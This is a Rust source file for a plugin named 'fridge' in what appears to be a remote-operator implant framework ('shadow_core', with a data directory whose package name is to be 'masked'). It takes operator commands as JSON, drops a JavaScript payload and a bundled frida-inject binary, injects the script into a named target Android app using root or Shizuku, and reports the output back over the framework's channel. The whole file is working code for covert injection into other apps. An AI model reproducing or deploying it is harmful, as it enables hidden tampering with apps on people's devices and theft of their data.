use shadow_core::module::{ShadowContext, ShadowModuleApi};
use std::os::raw::c_char;
use std::ffi::CString;
use tokio::process::Command;
use tokio::fs;

static mut CTX: Option<ShadowContext> = None;

#[no_mangle]
pub extern "C" fn shadow_module_init(ctx: ShadowContext) -> i32 {
    unsafe { CTX = Some(ctx); }
    0
}

#[no_mangle]
pub extern "C" fn shadow_module_handle_cmd(payload: *const u8, len: usize) -> *mut u8 {
    let req = unsafe { std::slice::from_raw_parts(payload, len) };
    
    let response = match std::str::from_utf8(req) {
        Ok(json_str) => {
            let json_str = json_str.to_string();
            tokio::spawn(async move {
                if let Err(e) = execute_frida_injection(&json_str).await {
                    send_frame(format!("{{\"error\":\"{}\"}}", e).as_bytes());
                }
            });
            "{\"status\":\"preparing_injection\"}".to_string()
        }
        Err(_) => "{\"error\":\"invalid_utf8\"}".to_string()
    };
    
    let c_str = CString::new(response).unwrap();
    c_str.into_raw() as *mut u8
}

async fn execute_frida_injection(json_str: &str) -> anyhow::Result<()> {
    let v: serde_json::Value = serde_json::from_str(json_str)?;
    let target = v.get("target").and_then(|v| v.as_str()).ok_or_else(|| anyhow::anyhow!("Missing target package/pid"))?;
    // The script payload (JS) to execute in the target
    let script = v.get("script").and_then(|v| v.as_str()).unwrap_or("console.log('Injected');");

    // 1. Stage frida-gadget.so and frida-inject (must be bundled/downloaded)
    // For this module, we assume frida-inject (statically compiled) is dropped into our data dir
    let data_dir = "/data/data/com.shadow.operator/files"; // Adjust to masked package
    let injector_path = format!("{}/frida-inject", data_dir);
    
    // Write the JS script to a temp file
    let script_path = format!("{}/payload.js", data_dir);
    fs::write(&script_path, script).await?;
    
    // Make injector executable
    Command::new("chmod")
        .args(&["+x", &injector_path])
        .output()
        .await?;

    // 2. Execute frida-inject
    // frida-inject -n com.target.app -s payload.js
    let mut cmd = Command::new(&injector_path);
    cmd.args(&["-n", target, "-s", &script_path]);
    
    // Note: Requires root or Shizuku (run-as) depending on the target.
    // If running under Shizuku context, this will work for any debuggable app, 
    // or any app if rooted.
    let output = cmd.output().await?;
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    
    // Clean up script
    let _ = fs::remove_file(script_path).await;

    let result = format!("{{\"target\":\"{}\",\"stdout\":\"{}\",\"stderr\":\"{}\"}}", 
                         target, stdout.replace('"', "\\\"").replace('\n', "\\n"), stderr.replace('"', "\\\"").replace('\n', "\\n"));
                         
    send_frame(result.as_bytes());
    Ok(())
}

fn send_frame(data: &[u8]) {
    unsafe {
        if let Some(ctx) = &CTX {
            (ctx.send_frame)(data.as_ptr(), data.len());
        }
    }
}

#[no_mangle]
pub extern "C" fn shadow_module_shutdown() -> i32 { 0 }

#[no_mangle]
pub static SHADOW_API: ShadowModuleApi = ShadowModuleApi {
    name: b"fridge\0".as_ptr() as *const c_char,
    version: 2,
    init: shadow_module_init,
    handle_cmd: shadow_module_handle_cmd,
    shutdown: shadow_module_shutdown,
};

#[no_mangle]
pub unsafe extern "C" fn shadow_module_get_api() -> *const ShadowModuleApi {
    &SHADOW_API as *const ShadowModuleApi
}